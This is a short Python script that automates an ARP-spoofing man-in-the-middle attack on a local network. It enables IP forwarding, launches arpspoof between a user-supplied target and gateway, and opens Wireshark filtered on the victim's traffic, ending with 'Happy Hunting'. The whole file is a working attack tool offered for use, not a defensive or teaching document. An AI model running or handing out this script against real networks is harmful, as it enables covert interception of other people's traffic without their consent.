#!/usr/bin/python

import subprocess as sb
import time,os,sys
from termcolor import cprint
if os.getuid() != 0:
  cprint("[!]please run it as root","red")
  sys.exit(0)

cprint("[+]started at : {0}".format(time.ctime()),"green")
time.sleep(1)
destip = raw_input("Target IP >> ")
gateway = raw_input("Gateway IP >> ")
interface = raw_input("Interface >> ")
cprint("[+]Enabling IP forwarding ..","green")
time.sleep(1)
try:
 sb.Popen("xterm -hold -e echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 cprint("[+]IP forwarding enabled","green")
 time.sleep(1)
except:
 cprint("[!]Error while enabling IP forwarding ..","red")
 cprint("[!]Aborting ..","red")
cprint("[+]Launching arpsoofing .. ","green")
time.sleep(1)
try:
 arpcommand = "xterm -hold -e arpspoof -i {0} -t {1} -r {2}".format(interface,destip,gateway)
 sb.Popen(arpcommand,shell=True)
 cprint("[+]arpspoofing launched","green")
 time.sleep(1)
except:
  cprint("[!]Error while launching arpsoof ..","red")
  sys.exit(0)
cprint("[+]Launching wireshark .. ","green")
time.sleep(1)
try:
 wireshark_command="xterm -hold -e wireshark -i {0} -k -Y 'ip.src=={1}'".format(interface,destip)
 sb.Popen(wireshark_command, shell=True)	
 cprint("[+]wireshark launched","green")
 time.sleep(1)
except:
  cprint("[!]Error while launching wireshark ..","red")
  sys.exit(0)

cprint("All Done ! Happy Hunting :D","blue")
